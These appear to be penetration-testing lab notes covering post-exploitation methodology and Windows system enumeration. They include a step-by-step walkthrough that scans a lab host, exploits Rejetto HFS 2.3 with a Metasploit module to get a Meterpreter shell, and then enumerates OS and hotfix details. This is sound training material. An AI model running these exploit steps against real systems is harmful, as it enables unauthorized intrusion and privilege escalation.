# Introduction

## Post-Exploitation

### Introduction to Post-Exploitation

#### Post-Exploitation

- Post-exploitation is the final phase of the pentest process and consists of the tactics, techniques and procedures that attackers/adversaries undertake after obtaining initial access on a target system.
- In other words, post-exploitation involves what you do or have to do once you gain an initial foothold on the target system.
- Post-exploitation will differ based on the target operating system as well as the target infrastructure.
- The post-exploitation techniques and tools that you canuse will depend on what kind of access you have on the system you have compromised as well as how stealthy you have to be.
- This ultimately means that you will need to utilize different techniques and tools based on the target operating system and its configuration.
- The post-exploitation techniques you can run against the target will need to abide by the rules of engagement agreed upon with the client you are perform the pentest for.

**Note:** When running post-exploitation techniques, you need to be sure that you have the necessary permissions and rights to modify services, system configurations, perform privilege escalation, delete logs etc.

![grafik](https://github.com/user-attachments/assets/37bcb4e2-30fd-4654-a6be-26d736921485)


This diagram outlines the various phases of the pentesting lifecycle and highlights the post exploitation phase and the techniques that fall under the post-exploitation phase
  
### Post-Exploitation Methodology

#### Post-Exploitation Methodology

In order to perform a thorough and complete post-exploitation phase, we need to utilize a structured methodology that encompasses the most important stages of post-exploitation that can be applied during engagements.
This structured, methodological approach ensured that we do not skip/overlook important phases of the post-exploitation phase in addition to providing us with trackable objectives based on each stage.

#### Post-Exploitation Methodology

![grafik](https://github.com/user-attachments/assets/f258672d-32f0-4398-9055-1254d16e44e7)

#### Local Enumeration

![grafik](https://github.com/user-attachments/assets/6b551663-dd57-4e06-956b-4e819717dc27)

#### Transferring Files

![grafik](https://github.com/user-attachments/assets/9cb527ee-3a8b-4efc-95ed-844a626bf567)

#### Upgrading Shells

![grafik](https://github.com/user-attachments/assets/c74a105a-480c-4bbe-9cd6-edb18a8d777c)

#### Privilege Escalation

![grafik](https://github.com/user-attachments/assets/0e3242b3-3d4f-4b80-8cff-e2bdcfe783bb)

#### Persistence 

![grafik](https://github.com/user-attachments/assets/64a60b50-4d17-44f7-8ac2-bacf95f67253)

#### Dumping & Cracking Hashes

![grafik](https://github.com/user-attachments/assets/38ea8a98-afa0-434a-91ee-b2f3a142d716)

#### Pivoting

![grafik](https://github.com/user-attachments/assets/43063dc6-7abd-40fa-b1e8-7cf56a6164a6)

#### Clearing Your Tracks 

![grafik](https://github.com/user-attachments/assets/1a380143-5adb-4f68-a339-e845b3383064)

# Windows Enumeration

## Windows Local Enumeration

### Enumerating System Information

#### Enumerating System Information

- After gaining initial access to a target system, it is always important to learn more about the system like, what OS is running as well as the OS version. This information is useful as it gives us an idea of what we can do and what type of exploits we can run.
- What are we looking for?
  - Hostname
  - OS Name (Windows 7,8 etc)
  - OS Build & Service Pack (Windows 7 SP1 7600)
  - OS Architecture (x64&x86)
  - Installed updates/Hotfixes

### Demo: Enumerating System Information


### ### Step 1: Check Connectivity to the Target

To verify if the target machine is reachable, use the **ping** command:

```bash
ping -c 4 demo.ine.local
```

- If the target responds, it indicates that the system is reachable.

### ### Step 2: Port Scanning with Nmap

Perform a service version detection scan to identify vulnerable services on the target system using **Nmap**:

```bash
nmap -sV demo.ine.local
```

- The scan should reveal services running on open ports. In this case, port **80** is running **Rejetto HTTP File Server 2.3**.

### ### Step 3: Searching for Exploits Using Searchsploit

With the information from the Nmap scan, search for known vulnerabilities affecting **Rejetto HTTP File Server 2.3** using **Searchsploit**:

```bash
searchsploit rejetto
```

- The **Searchsploit** output reveals an available **Metasploit Framework exploit module** that targets this version of **Rejetto**.

### ### Step 4: Gaining Access with Metasploit

To exploit the vulnerability, start the **Metasploit Framework** and use the **Rejetto HFS exploit module**:

1. Start **Metasploit**:

    ```bash
    msfconsole
    ```

2. Load the **Rejetto HFS exploit module**:

    ```bash
    use exploit/windows/http/rejetto_hfs_exec
    ```

3. Set the target address:

    ```bash
    set RHOSTS demo.ine.local
    ```

4. Execute the exploit:

    ```bash
    exploit
    ```

If successful, this will open a **Meterpreter session** on the target system.

### ### Step 5: Enumerating System Information

Once you gain access to the system, itâ€™s important to gather as much information as possible to understand the system's environment and any potential vulnerabilities.

### Step 5.1: System Information with Meterpreter

Run the **sysinfo** command to get basic system information:

```bash
sysinfo
```

- Output: Shows the **operating system**, **hostname**, **architecture**, and **domain** of the target system. In this case, the system is running **Windows Server 2012 R2**.

### Step 5.2: Spawn a Native Shell and Get Hostname

To switch to a native shell session on the target, run:

```bash
shell
```

Once in the shell, you can run native Windows commands, such as getting the hostname:

```bash
hostname
```

### Step 5.3: Detailed System Information

For more detailed system information, such as hardware details and a list of installed Windows updates, use the **systeminfo** command:

```bash
systeminfo
```

- This provides critical details, including **Windows version**, **OS build number**, **hardware configuration**, and **installed HotFixes**.

You can also retrieve a detailed list of installed updates, including the **HotFix IDs** and **installation dates**, by running the following **WMIC** command:

```bash
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

- Output: Displays when each update was installed and its **HotFix ID**, which helps identify potential vulnerabilities or missing patches.

### ### Why Is This Information Important?

- **Installed HotFixes** and **system details** provide insight into whether the system is missing critical updates or patches that could allow for privilege escalation or lateral movement.
- Knowing the **operating system** version, build number, and installed patches helps you determine if there are any known vulnerabilities that can be exploited to further compromise the system.

---

### Conclusion

In this demo, we:
1. Checked connectivity to the target system.
2. Used **Nmap** to identify services running on the target.
3. Found an exploit for **Rejetto HTTP File Server 2.3** using **Searchsploit**.
4. Exploited the service using **Metasploit** to gain a **Meterpreter session** on the target.
5. Enumerated system information, including the **Windows version**, **installed updates**, and other details, to identify potential vulnerabilities.

This process is critical in any penetration test as it helps gather useful information that can be used to further escalate privileges or move laterally across the network.






